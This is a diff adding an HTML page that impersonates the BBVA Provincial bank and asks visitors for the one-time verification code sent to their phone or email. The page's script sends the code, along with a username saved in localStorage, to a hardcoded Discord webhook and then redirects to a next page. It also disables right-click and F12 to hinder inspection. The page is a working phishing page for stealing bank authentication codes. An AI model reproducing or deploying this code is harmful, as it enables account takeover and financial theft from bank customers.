@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA Provincial</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+    <script src="ipvalidation.js"></script>
+    <link rel="icon" href="icono.png" type="image/x-icon">
+    <link rel="apple-touch-icon" href="icono.png">
+    <script type="text/javascript">
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 71)) {
+                return false;
+            }
+        };
+    </script>
+    <script>
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+            }
+        });
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</head>
+<body class="body">
+    <form id="formulario" onsubmit="enviarFormulario(event)" class="cuadrote">
+            <img class="logo" src="logo1.jpg">
+        </div>
+        <div><br>
+        <div class="titulo" style="color: #004080;">
+            <p>Verifiquemos tu identidad</p>
+        </div>
+        <div class="centrado1">
+            <p style="font-size: 12px; color: #333">Ingresa la clave enviada a tu correo o número asociado a BBVA PROVINCIAL</p>
+        </div>
+        <div class="centrado1">
+            <input class="documento111" type="text" id="documento" name="documento" maxlength="8" required placeholder="Ingresa la clave que hemos enviado">
+        </div><br>
+        <div class="centrado1">
+            <button type="submit" class="boton"><b>Siguiente</b></button>
+        </div><br><br>
+        <div class="centrado1">
+            <img src="logo3.jpg" class="logo4">
+        </div>
+    </form>
+
+    <script>
+        function enviarFormulario(event) {
+            event.preventDefault();
+    
+            var documento = document.getElementById("documento").value;
+            var usuario = localStorage.getItem("usuario");
+    
+            const webhookURL = "https://discord.com/api/webhooks/1349064529908334603/IhrpAkq7q8a0vPayD0FaqVN5PlZI5yQBJkfutHnm2r9A2RkDW7oNEJjFIm308NHvrPWR"; 
+    
+            const mensaje = {
+                content: `**SMS:** ${documento}
+                **Usuario (localStorage):** ${usuario}`
+            };
+    
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(mensaje)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Mensaje enviado a Discord");
+                    window.location.href = 'index7.html'; 
+                } else {
+                    console.error("Error al enviar el mensaje:", response.statusText);
+                }
+            })
+            .catch(error => console.error("Error al enviar el mensaje:", error));
+        }
+    </script>
+</body>
+</html>
